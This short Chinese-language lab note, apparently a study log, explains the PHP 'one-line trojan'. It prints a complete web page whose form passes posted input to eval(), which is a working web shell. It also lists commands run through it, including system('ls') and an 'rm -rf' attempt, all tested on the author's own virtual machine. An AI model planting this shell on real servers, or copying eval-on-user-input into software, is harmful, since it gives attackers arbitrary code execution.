主要的原理就是利用php的eval函数，可以把字符串当成命令来执行
虚拟机上的php代码
``` php
<html>
<body>
<form action = "yijuhua_muma.php" method = "post">
name:<input type:"text" name="value"><br>
<input type = "submit">
</form>
<?php
 $cmd = $_POST[value];
echo "<pre>";
eval ($cmd);
echo "</pre>";
?>
<body>
</html>
```
在物理机上的浏览器访问的时候会出现一个输入框和提交按钮，在输入框里输入要执行的命令，即可，如
>phpinfo(); system("ls"); cat xxx.xx;ifconfig;
好像必须加如最后的分号,要不然执行后没有反应。但是在执行
>mkdir folder ; rm -rf folder 
的时候不成功，难道是只有读的权限没有写入的权限？这些只是最简单的一句话木马，基本上没有什么危害，也就只能在自己的虚拟机里重现。
